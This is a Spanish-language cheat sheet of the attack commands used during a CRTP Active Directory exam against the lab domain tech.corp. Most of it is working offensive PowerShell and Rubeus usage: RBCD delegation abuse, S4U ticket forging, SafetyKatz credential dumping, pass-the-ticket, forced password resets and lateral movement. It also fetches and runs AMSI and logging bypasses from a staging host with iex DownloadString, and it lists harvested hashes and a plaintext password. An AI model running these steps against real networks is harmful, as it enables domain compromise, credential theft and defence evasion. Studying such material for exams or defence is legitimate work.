# CRTP Exam — Comandos por Fase

**Lab:** tech.corp  
**Usuario inicial:** TECH\studentuser (`172.16.100.10`)  
**Máquinas:** studvm · tech-dc · mgmtsrv · techsrv30 · adminsrv86 · finance-dc

---

## 1. Setup Inicial (studvm)

```powershell
# Execution Policy
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Agregar studentuser a Administradores locales (credencial hallada en texto plano)
net localgroup Administrators TECH\studentuser /add
```

---

## 2. Enumeración del Dominio

```powershell
Import-Module .\PowerView.ps1

# Usuarios
Get-DomainUser | select -ExpandProperty samaccountname

# Equipos
Get-DomainComputer | select -ExpandProperty dnshostname

# Domain Admins
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"

# GPOs aplicadas a tech-dc
Get-DomainGPO -ComputerIdentity tech-dc
```

### Escaneo de puertos (todos los hosts)

```powershell
$Ports = @(80,443,8000,8443,3389,445,135,5985,5986,22,1433,3306,5432)
Get-DomainComputer | Select-Object -ExpandProperty DNSHostName | ForEach-Object {
    $HostName = $_
    try {
        $IP = (Resolve-DnsName $HostName -Type A -ErrorAction Stop |
               Select-Object -First 1 -ExpandProperty IPAddress)
        $OpenPorts = foreach ($Port in $Ports) {
            try {
                $TcpClient = New-Object System.Net.Sockets.TcpClient
                $Connect   = $TcpClient.BeginConnect($HostName, $Port, $null, $null)
                if ($Connect.AsyncWaitHandle.WaitOne(500, $False)) {
                    $TcpClient.EndConnect($Connect)
                    $TcpClient.Close()
                    $Port
                } else { $TcpClient.Close() }
            } catch {}
        }
        if ($OpenPorts) {
            [PSCustomObject]@{
                DNSHostName = $HostName
                IP          = $IP
                OpenPorts   = ($OpenPorts -join ",")
            }
        }
    } catch {}
} | Format-Table -AutoSize
```

---

## 3. RBCD Attack — studvm$ → mgmtsrv

> **Primitiva:** studvm$ tiene **GenericWrite** sobre el objeto mgmtsrv en AD.

```powershell
# 1. Verificar el permiso
Get-DomainObjectAcl -Identity mgmtsrv -ResolveGUIDs | Where-Object {
    (ConvertFrom-SID $_.SecurityIdentifier) -match 'STUDVM' -and
    $_.ActiveDirectoryRights -match 'Generic'
}

# 2. Escribir msDS-AllowedToActOnBehalfOfOtherIdentity
$sid = (Get-DomainComputer -Identity studvm).objectsid
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor `
       "D:AI(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$sdBytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdBytes, 0)
Set-DomainObject -Identity mgmtsrv `
    -Set @{'msds-allowedtoactonbehalfofotheridentity' = $sdBytes}

# 3. S4U — obtener ticket como techadmin sobre mgmtsrv
# Hash RC4 de studvm$: 01766386a8a082a359e9baf437cc7ce6
.\Rubeus.exe s4u /user:studvm$ /rc4:01766386a8a082a359e9baf437cc7ce6 `
    /impersonateuser:techadmin `
    /msdsspn:host/mgmtsrv.tech.corp `
    /altservice:http,wsman,ptt

# 4. Acceder a mgmtsrv
Invoke-Command -ComputerName mgmtsrv.tech.corp -ScriptBlock { hostname; whoami }
Enter-PSSession -ComputerName mgmtsrv.tech.corp -Authentication Kerberos
```

---

## 4. Dump de Credenciales (mgmtsrv como techadmin)

```powershell
# Descargar herramientas desde el servidor HTTP en studvm
Invoke-WebRequest -Uri "http://172.16.100.10/PowerView.ps1" -OutFile "PowerView.ps1"

# Dump con SafetyKatz (evasive para bypassear Defender en memoria)
.\Safty.exe "sekurlsa::evasive-keys" "exit"
```

### Hashes obtenidos

| Cuenta | Hash AES256/NTLM |
|---|---|
| `mgmtsrv$` | `72172516b26f4b7d6df600fff77555301804309d7494ea293a0f87b008fa3199` |
| `techservice` | `c08ab7bab7fec602e8dbcf924e4a8bf42b6dbc323a7296f2933311e82028061a` |

---

## 5. TGT con Hash — techservice → tech-dc

```powershell
# Pedir TGT e inyectarlo en memoria (/ptt)
.\Rubeus.exe asktgt /user:techservice `
    /aes256:c08ab7bab7fec602e8dbcf924e4a8bf42b6dbc323a7296f2933311e82028061a `
    /show /ptt
```

---

## 6. Abuso de Permisos — techservice → grupo Management → puretech

```powershell
Import-Module .\PowerView.ps1

# Añadir techservice al grupo Management
Add-DomainGroupMember -Identity "Management" -Members "techservice" -Verbose
Get-DomainGroupMember -Identity "Management" | Select MemberName

# Cambiar contraseña de puretech
$UserPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
Set-DomainUserPassword -Identity puretech -AccountPassword $UserPassword

# Hash NTLM de Password123
# PAssword123 → 58A478135A93AC3BF058A5EA0E8FDB71
```

---

## 7. Movimiento Lateral — techsrv30 como puretech

```powershell
# Conectar a techsrv30
$secpass = ConvertTo-SecureString "Password123" -AsPlainText -Force
$creds   = New-Object System.Management.Automation.PSCredential("TECH\puretech", $secpass)
Enter-PSSession -ComputerName techsrv30.tech.corp -Credential $creds

# Setup de directorio de trabajo
New-Item -ItemType Directory -Force -Path C:\TempTools
cd C:\TempTools

# Descargar herramientas
Invoke-WebRequest -Uri "http://172.16.100.10/SafetyKatz.exe" -OutFile "Sefty.exe"
Invoke-WebRequest -Uri "http://172.16.100.10/Rubeus.exe"     -OutFile "Rubeus.exe"
Invoke-WebRequest -Uri "http://172.16.100.10/PsExec.exe"     -OutFile "PsExec.exe"

# Bypasses en memoria
iex (New-Object System.Net.WebClient).DownloadString('http://172.16.100.10/sbloggingbypass.txt')
iex (New-Object System.Net.WebClient).DownloadString('http://172.16.100.10/Amsi-Byp.txt')
```

---

## Resumen de Hashes / Credenciales

| Cuenta | Valor | Uso |
|---|---|---|
| `studvm$` | `01766386a8a082a359e9baf437cc7ce6` | RC4 para RBCD S4U |
| `studentuser` | `5bade58465eca3499257e8b90d99f9aa` | Movimiento lateral |
| `studentadmin` | `97daeac345542c952eea4446471ca158` | Admin local en studvm |
| `mgmtsrv$` | `72172516b26f4b7d6df600fff77555301804309d7494ea293a0f87b008fa3199` | AES256 |
| `techservice` | `c08ab7bab7fec602e8dbcf924e4a8bf42b6dbc323a7296f2933311e82028061a` | AES256 para TGT |
| `puretech` | `58A478135A93AC3BF058A5EA0E8FDB71` | NTLM de Password123 |
| `studentadmin` (texto plano) | `P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!` | Hallada en share |

---

*Generado durante examen CRTP — tech.corp — 2026*